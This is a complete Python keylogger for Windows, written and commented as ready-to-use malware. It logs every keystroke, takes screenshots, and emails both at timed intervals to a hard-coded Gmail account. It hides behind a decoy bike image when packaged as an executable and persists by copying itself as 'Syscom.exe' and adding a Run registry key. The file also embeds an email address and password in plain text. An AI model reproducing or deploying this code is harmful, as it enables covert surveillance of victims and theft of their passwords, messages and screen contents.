#!usr/bin/env python
import os
import shutil
import smtplib
import subprocess
import sys
import threading
import pynput.keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import email.encoders
import autopy

# Created a class for keylogger and contains all the function of it
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        # Will send the message to your mail id "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        # This two lines
        file_name = sys._MEIPASS + "/bike.jpg"  # this "bike.jpg" is the file name used in pyinstaller to create the .exe file
        # as this file is created into a image file of a bike named "bike.jpg"
        subprocess.Popen(file_name, shell=True)
        # Above two line opens the file stored in the second place
        # If you are not using pyinstaller, erase those two lines
        self.persistance()

    # This function is defined to make program persistent
    # It will make a copy of file at a hidden location and will add it to startup programs
    def persistance(self):
        file_loc = os.environ["appdata"] + "\\Syscom.exe"
        if not os.path.exists(file_loc):
            shutil.copyfile(sys.executable, file_loc)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows /t REG_SZ /d "'
                            + file_loc + '"', shell=True)

    # This function appends all the keys to make it a whole word/sentence
    def append_to_log(self, string):
        self.log = self.log + string

    # This function records all the keys pressed and store it in a string
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    # This function captures screenshot and stores them as "screenshot.png"
    # and after that using send_email function it sends the picture via mail
    def screenshot(self):

        bitmap = autopy.bitmap.capture_screen()
        bitmap.save('image.png')
        self.send_image("image.png")

    def send_image(self, attach):

        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Screenshot"

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(open(attach, 'rb').read())
        email.encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
        msg.attach(part)

        self.send_mail(self.email, self.password, msg.as_string())


    # This function reports all the keys pressed on the email at a certain time interval using threading timer
    def report(self):
        if self.log != "":
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.screenshot()
        self.log = ""

        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # This function writes and send mails using the server of gmail
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # This function starts the keylogger and starts functions in correct order
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Here we call function and provide all the parameters that are time interval, email, password.
# if you are using it provide your email , password below

my_keylogger = Keylogger(20, "multitalonted@gmail.com", "Hackerkimkc")    # Parameters order :- time, "email", "password"

# starts the keylogger class

my_keylogger.start()
